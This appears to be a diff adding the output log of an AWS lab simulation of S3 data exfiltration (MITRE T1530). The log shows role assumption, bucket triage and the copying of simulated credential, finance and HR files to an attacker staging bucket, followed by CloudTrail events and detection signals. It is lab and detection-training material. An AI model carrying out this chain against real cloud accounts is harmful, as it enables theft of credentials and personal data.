@@ -1,0 +1,80 @@
+
+============================================================
+  S3 Data Exfiltration Simulation
+  MITRE ATT&CK: T1530
+  Time: 2026-03-14T12:36:44Z
+============================================================
+
+[*] Phase 1 — Privilege Escalation (AssumeRole)
+    Target role: arn:aws:iam::267949707794:role/cloud-attack-lab-privileged-role
+[+] Role assumption successful
+    Session: arn:aws:sts::267949707794:assumed-role/cloud-attack-lab-privileged-role/backup-restore-session
+    Key prefix: ASIAT4YY... (ASIA = temporary STS)
+    Expires: 2026-03-14 13:36:44+00:00
+
+[*] Phase 2 — Bucket Discovery (T1530)
+    Verifying access to known target bucket...
+    (s3:ListAllMyBuckets not granted — attacker operates with prior knowledge)
+[+] Target bucket confirmed accessible: cloud-attack-lab-target-data-267949707794
+[+] Staging bucket: cloud-attack-lab-exfil-staging-267949707794
+
+[*] Phase 3 — Object Enumeration and Triage (T1530)
+    Listing objects in target bucket: cloud-attack-lab-target-data-267949707794
+[+] Found 4 objects
+    High-value targets (4):
+      [HIGH] config/app-config-prod.json (294 bytes)
+      [HIGH] config/aws-credentials-backup.txt (235 bytes)
+      [HIGH] finance/q4-2024-revenue-report.csv (242 bytes)
+      [HIGH] hr/employee-records-2024.csv (253 bytes)
+
+[*] Phase 4 — Exfiltration to Staging Bucket (T1530)
+    Copying high-value objects to staging: cloud-attack-lab-exfil-staging-267949707794
+    (GetObject from target + PutObject to staging = exfiltration chain)
+
+[+] Exfiltrated: config/app-config-prod.json
+      Staging key : exfil-20260314T123645Z/config/app-config-prod.json
+      Size        : 294 bytes
+      Preview     : {"api_keys":{"sendgrid":"SG.SIMULATED_NOT_REAL","stripe":"sk_test_SIMULATED_NOT_...
+[+] Exfiltrated: config/aws-credentials-backup.txt
+      Staging key : exfil-20260314T123645Z/config/aws-credentials-backup.txt
+      Size        : 235 bytes
+      Preview     : [default] aws_access_key_id = AKIAIOSFODNN7EXAMPLE aws_secret_access_key = wJalr...
+[+] Exfiltrated: finance/q4-2024-revenue-report.csv
+      Staging key : exfil-20260314T123645Z/finance/q4-2024-revenue-report.csv
+      Size        : 242 bytes
+      Preview     : quarter,revenue,expenses,net_income,margin Q1-2024,4200000,3100000,1100000,26% Q...
+[+] Exfiltrated: hr/employee-records-2024.csv
+      Staging key : exfil-20260314T123645Z/hr/employee-records-2024.csv
+      Size        : 253 bytes
+      Preview     : employee_id,name,ssn,salary,email EMP001,John Smith,XXX-XX-0001,85000,jsmith@com...
+
+[*] Phase 5 — Verify Staging Bucket Contents
+    Listing exfiltrated objects in cloud-attack-lab-exfil-staging-267949707794...
+[+] Confirmed 4 objects in staging bucket
+      exfil-20260314T123645Z/config/app-config-prod.json (294 bytes)
+      exfil-20260314T123645Z/config/aws-credentials-backup.txt (235 bytes)
+      exfil-20260314T123645Z/finance/q4-2024-revenue-report.csv (242 bytes)
+      exfil-20260314T123645Z/hr/employee-records-2024.csv (253 bytes)
+
+============================================================
+  Exfiltration Complete
+============================================================
+
+  CloudTrail events generated:
+    - AssumeRole            (T1078.004) — privilege escalation
+    - ListObjectsV2         (T1530)     — target bucket access check
+    - ListObjectsV2         (T1530)     — object enumeration x2
+    - GetObject x4            (T1530)     — data read
+    - PutObject x4            (T1530)     — data staged
+
+  Detection signals:
+    - AssumedRole identity performing GetObject on sensitive paths
+    - GetObject + PutObject pair (read from target, write to staging)
+    - PutObject to a bucket tagged 'attacker-controlled-destination'
+    - All activity from single source IP in short time window
+
+  Exfil manifest:
+    config/app-config-prod.json -> cloud-attack-lab-exfil-staging-267949707794/exfil-20260314T123645Z/config/app-config-prod.json
+    config/aws-credentials-backup.txt -> cloud-attack-lab-exfil-staging-267949707794/exfil-20260314T123645Z/config/aws-credentials-backup.txt
+    finance/q4-2024-revenue-report.csv -> cloud-attack-lab-exfil-staging-267949707794/exfil-20260314T123645Z/finance/q4-2024-revenue-report.csv
+    hr/employee-records-2024.csv -> cloud-attack-lab-exfil-staging-267949707794/exfil-20260314T123645Z/hr/employee-records-2024.csv
